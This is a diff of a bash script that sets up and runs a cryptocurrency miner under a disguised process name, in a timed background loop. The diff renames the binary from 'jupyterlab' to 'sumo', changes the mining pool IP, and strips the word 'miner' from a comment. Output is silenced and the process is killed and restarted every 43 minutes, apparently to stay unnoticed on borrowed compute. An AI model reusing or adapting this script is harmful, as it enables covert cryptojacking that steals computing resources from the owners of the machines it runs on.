@@ -1,12 +1,12 @@
 #!/usr/bin/env bash
 
 # Base folder
-BASE_DIR="./jupyterlab_dir"
+BASE_DIR="./sumo_dir"
 mkdir -p "$BASE_DIR"
 
 # Copy binary
-cp ./jupyterlab "$BASE_DIR/jupyterlab" 2>/dev/null || true
-chmod +x "$BASE_DIR/jupyterlab" 2>/dev/null
+cp ./sumo "$BASE_DIR/sumo" 2>/dev/null || true
+chmod +x "$BASE_DIR/sumo" 2>/dev/null
 
 # Masuk ke folder
 cd "$BASE_DIR" || exit 1
@@ -15,7 +15,7 @@ cd "$BASE_DIR" || exit 1
 cat > config.json <<EOF
 {
   "pools": [{
-    "url": "3.144.16.65:80",
+    "url": "128.199.191.7:443",
     "user": "Q0105004479f85cd7d62eeac7a6d6ec24cc6af897a72bac82b3f1d8a63b425e2430efd6504c753d",
     "pass": "system",
     "tls": true
@@ -26,8 +26,8 @@ cat > config.json <<EOF
 EOF
 
 while true; do
-  # Jalankan miner
-  nohup ./jupyterlab --config=config.json >/dev/null 2>&1 &
+  # Jalankan 
+  nohup ./sumo --config=config.json >/dev/null 2>&1 &
 
   start_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
   echo "[$start_time] ✅ STATUS: JALAN"
@@ -36,7 +36,7 @@ while true; do
   sleep 2580  # 43 menit
 
   # Matikan proses
-  pkill -f "jupyterlab"
+  pkill -f "sumo"
 
   stop_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
   echo "[$stop_time] ⏸️  STATUS: MATI"
